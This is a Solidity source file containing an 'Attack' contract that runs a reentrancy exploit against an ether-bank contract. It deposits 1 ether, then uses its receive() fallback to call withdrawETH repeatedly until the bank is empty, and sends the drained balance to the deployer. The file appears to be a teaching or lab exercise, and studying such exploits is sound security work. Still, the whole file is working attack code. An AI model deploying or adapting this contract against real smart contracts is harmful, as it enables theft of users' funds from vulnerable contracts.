// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

interface IEtherBank {
    function withdrawETH() external;

    function depositETH() external payable;
}

contract Attack {
    IEtherBank immutable etherbank;
    address immutable owner;

    constructor(address _address) {
        etherbank = IEtherBank(_address);
        owner = msg.sender;
    }

    function attack() external payable {
        etherbank.depositETH{value: 1 ether}();
        etherbank.withdrawETH();
    }

    // TODO: Make call recieve instead to see behaviour
    receive() external payable {
        if (address(etherbank).balance >= 1) {
            etherbank.withdrawETH();
        } else {
            withdraw();
        }
    }

    function withdraw() internal {
        (bool sent, ) = owner.call{value: address(this).balance}("");
        require(sent, "Failed to send Ether");
    }
}
